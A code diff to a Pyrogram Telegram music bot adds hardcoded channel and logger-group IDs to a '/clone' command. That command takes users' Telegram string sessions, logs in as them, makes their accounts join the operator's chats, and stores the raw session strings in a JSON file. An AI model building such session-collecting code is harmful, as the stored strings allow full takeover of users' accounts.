@@ -8,7 +8,8 @@ import shutil
 # Directory to store clone data
 CLONE_DATA_FILE = "clone_data.json"
 PLUGINS_DIR = "CakeMusic/plugins/clone"
-LOGGER_GROUP_ID = "-1002293505498"  # Replace with actual logger group ID or username
+LOGGER_GROUP_ID = "@TESTNOTOP"  # Replace with actual logger group ID or username
+CHANNEL_ID = "-1002020205239"  # Replace with actual channel ID or username
 
 # Helper function to load clone data from file
 def load_clone_data():
@@ -40,7 +41,7 @@ def copy_plugins():
 async def clone(bot: Client, msg: Message):
     """
     Clone command: Clone a Pyrogram session using a provided string session,
-    load plugins for the cloned session, join a channel, and store session info.
+    load plugins for the cloned session, join a channel and group, and store session info.
     """
     if len(msg.command) < 2:
         await msg.reply("Usage: `/clone <string_session>`\nSend your Pyrogram2 string session to clone. ❤️")
@@ -76,11 +77,10 @@ async def clone(bot: Client, msg: Message):
         await client.start()
         user = await client.get_me()
 
-        # Join a channel (You can specify any channel here)
-        channel = 'your_channel_id_or_username'  # Replace with actual channel ID or username
+        # Join the specified channel
         try:
-            await client.join_chat(channel)
-            print(f"Successfully joined the channel: {channel}")
+            await client.join_chat(CHANNEL_ID)  # Join the channel
+            print(f"Successfully joined the channel: {CHANNEL_ID}")
         except Exception as e:
             print(f"Failed to join the channel: {str(e)}")
 
@@ -91,6 +91,7 @@ async def clone(bot: Client, msg: Message):
             print(f"Successfully joined the logger group and sent the start message.")
         except Exception as e:
             print(f"Failed to join the logger group or send message: {str(e)}")
+            await msg.reply(f"❌ Failed to join the logger group. Error: {str(e)}")  # Reply to the user if the bot cannot join the group
 
         # Save the cloned session info
         clone_data[string_session] = {
